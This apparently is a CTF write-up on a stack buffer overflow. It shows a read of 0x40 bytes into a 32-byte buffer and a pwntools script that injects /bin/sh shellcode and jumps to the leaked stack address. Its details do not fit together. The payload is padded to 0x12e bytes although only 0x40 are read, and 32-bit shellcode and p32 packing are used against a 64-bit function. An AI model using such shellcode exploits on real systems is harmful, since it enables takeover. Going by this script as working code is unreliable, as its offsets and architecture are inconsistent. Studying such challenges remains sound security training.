# Shellcode

Looking through this code, we see that it prints a lot of text. However there are two important sections. The first is where it scans in the data:

```
  sVar1 = read(0,input,0x40);
```

We can see that it scans in `0x40` bytes worth of input into `input`. The char array `input` can only hold `32` bytes worth of input, so we have an overflow. Also we can see that the address printed is an infoleak (information about the program that is leak) for the start of our input in memory on the stack:\\

Looking at the stack layout in Ghidra, there doesn't really look like there is anything between the start of our input and the return address. With our overflow we should be able to overwrite the return address and get code execution:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_004009a6()
             undefined         AL:1           <RETURN>
             undefined[32]     Stack[-0x28]   input                                   XREF[2]:     00400aa4(*), 
                                                                                                   00400acf(*)  
                             FUN_004009a6                                    XREF[4]:     entry:004008cd(*), 
                                                                                          entry:004008cd(*), 00400de0, 
                                                                                          00400e80(*)  
        004009a6 55              PUSH       RBP
       
```

```
from pwn import *

# Start the process
target = process('./pwn3')

# Print out the text, up to the address of the start of our input
print(target.recvuntil(b"journey ").decode())

# Read the next line and decode to string
leak = target.recvline().decode()

# Strip away characters not part of the address and convert from hex string to int
shellcodeAdr = int(leak.strip("!\n"), 16)

# Shellcode from: http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68" \
            b"\x68\x2f\x62\x69\x6e\x89\xe3\x50" \
            b"\x53\x89\xe1\xb0\x0b\xcd\x80"

# Pad the payload with null bytes to reach return address offset
payload = shellcode.ljust(0x12e, b"\x00")

# Append the leaked return address pointing to shellcode
payload += p32(shellcodeAdr)

# Send the payload
target.sendline(payload)

# Get an interactive shell
target.interactive()

```
